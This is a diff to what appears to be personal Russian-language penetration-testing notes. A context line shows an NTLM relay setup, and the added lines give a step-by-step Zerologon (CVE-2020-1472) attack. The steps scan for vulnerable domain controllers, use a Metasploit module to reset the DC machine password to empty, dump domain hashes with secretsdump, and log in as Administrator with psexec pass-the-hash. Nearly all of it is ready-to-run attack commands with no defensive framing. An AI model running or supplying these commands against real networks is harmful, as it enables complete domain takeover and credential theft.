@@ -30,3 +30,19 @@ sudo impacket-ntlmrelayx -tf nosigning.txt -smb2support -socks
 
 потом админ кликает на линку на шаре 
 socks
+
+
+
+
+#zerologon
+# поиск уязвимых контроллеров домен
+nxc smb <ip> -u '' -p '' -M zerologon
+sudo msfconsole 
+use auxiliary/admin/dcerpc/cve_2020_1472_zerologon
+set RHOSTS DC_IP
+set NBNAME <имя компьютера DC$>
+-> поменяли пароль комьютера DC на пустой
+# выполняем DCSync
+impacket-secretsdump <имя компьютера DC$>\@ip_контролера -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -> получаем хэши и учетки
+impacket-psexec -hashes <NTLM_хэш_администратора> Administrator@ip_контролера
+
